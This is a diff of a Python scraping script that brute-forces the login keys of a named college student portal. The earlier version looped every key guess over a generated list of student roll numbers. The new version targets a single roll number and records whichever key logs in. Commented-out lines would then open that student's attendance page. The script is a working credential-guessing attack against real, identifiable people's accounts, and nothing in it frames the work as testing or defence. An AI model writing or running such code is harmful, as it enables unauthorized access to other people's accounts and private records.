@@ -37,40 +37,20 @@ browser.set_handle_refresh(False)
 #     pas=input("enter password:")
 #     data[numb]=pas
 data={}
-rollnos=[]
-for i in range(1,10):
-    rollnos.append('20881A050'+str(i))
-for i in range(10,99):
-    rollnos.append('20881A05'+str(i))
-for i in range(10):
-    rollnos.append('20881A05A'+str(i))
-for i in range(10):
-    rollnos.append('20881A05B'+str(i))
-for i in range(10):
-    rollnos.append('20881A05C'+str(i))
 for i in combinations:
-    for j in rollnos:
-        login_url = 'https://studentscorner.vardhaman.org/student_corner_index.php'
-        browser.open(login_url)
-        browser.select_form(nr=0)
-        browser.form['rollno'] = j
-        browser.form['wak'] = i
-        response = browser.submit()
-        soup = BeautifulSoup(response, 'html.parser')
-        # Find the fifth table
-        table = soup.find('font')
-        print(str(table.text)[0],j)
-        if(table.text == 'Invalid Web Access Key ' or str(table.text)[0]=='C'):
-            continue
-        data[j]=i
-        print(j,i)
-        break
+    login_url = 'https://studentscorner.vardhaman.org/student_corner_index.php'
+    browser.open(login_url)
+    browser.select_form(nr=0)
+    browser.form['rollno'] = '20881A05B0'
+    browser.form['wak'] = i
+    response = browser.submit()
+    soup = BeautifulSoup(response, 'html.parser')
+    # Find the fifth table
+    table = soup.find('font')
+    print(str(table.text)[0],i)
+    if(table.text == 'Invalid Web Access Key ' or str(table.text)[0]=='C'):
+        continue
+    data['20881A05B0']=i
+    print('20881A05B0',i)
+    break
 print(data)
-# # Continue to attendance URL
-# attendance_url = 'https://studentscorner.vardhaman.org/student_attendance.php'
-# response = browser.open(attendance_url)
-# # Parse the HTML content using BeautifulSoup
-# soup = BeautifulSoup(response, 'html.parser')
-# # Find the fifth table
-# table = soup.find('font')
-# print(table.text)
